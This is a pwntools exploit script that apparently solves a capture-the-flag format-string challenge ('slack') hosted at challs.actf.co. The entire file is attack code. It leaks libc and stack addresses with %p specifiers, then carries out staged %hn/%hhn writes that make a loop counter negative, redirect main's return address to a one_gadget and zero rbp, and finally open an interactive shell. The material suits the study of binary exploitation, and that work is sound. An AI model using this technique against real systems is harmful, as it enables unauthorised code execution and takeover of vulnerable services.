from pwn import *


p = remote('challs.actf.co',31500)
def send_payload(payload):
    p.recvuntil(b'Professional): ')
    if len(payload) < 13:
        p.sendline(payload)
    else:
        p.send(payload)


# p = process('./slack')
# gdb.attach(p,api=True)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p.recvuntil(b'Professional): ')
p.sendline(b'%41$p-%1$p')
p.recvuntil(b'You: ')

leak = p.recvline()[:-1].decode().split('-')

# e.address = int(leak[1],16) - e.sym['main']
libc.address = int(leak[0], 16) - 128 - libc.sym['__libc_start_main']
ret_addr = int(leak[1], 16) + 8600

log.info(f'Stack: {hex(ret_addr)}\nLibc: {hex(libc.address)}')
one = 0x50a37+libc.address
log.info(f'one: {hex(one)}')

log.info('Stage 1: setup pointer for i')
payload = f'%{ret_addr - 109 & 0xffff}c%25$hn'
send_payload(payload)

log.info('Stage 2: change i to neg')
payload = f'%255c%55$hhn'
send_payload(payload)

log.info('Stage 3: setup pointer for main\'s ret')
payload = f'%{ret_addr & 0xffff}c%25$hn'
send_payload(payload)

log.info('Stage 4: change main ret to one_gadget')
payload = f'%{one & 0xffff}c%55$hn'
send_payload(payload)

log.info('Stage 5')
payload = f'%{ret_addr + 2 & 0xffff}c%25$hn'
send_payload(payload)

log.info('Stage 6')
payload = f'%{one  >> 16 & 0xff}c%55$hhn'
send_payload(payload)


log.info('Stage 7: setup pointer for rbp')
payload = f'%{ret_addr - 8  & 0xffff}c%25$hn'
send_payload(payload)

log.info('Stage 8: change rbp to 0')
payload = f'%55$hhn'
send_payload(payload)

payload = f'%{ret_addr - 109 & 0xffff}c%25$hn'
send_payload(payload)

payload = f'%10c%55$hhn'
send_payload(payload)
p.interactive()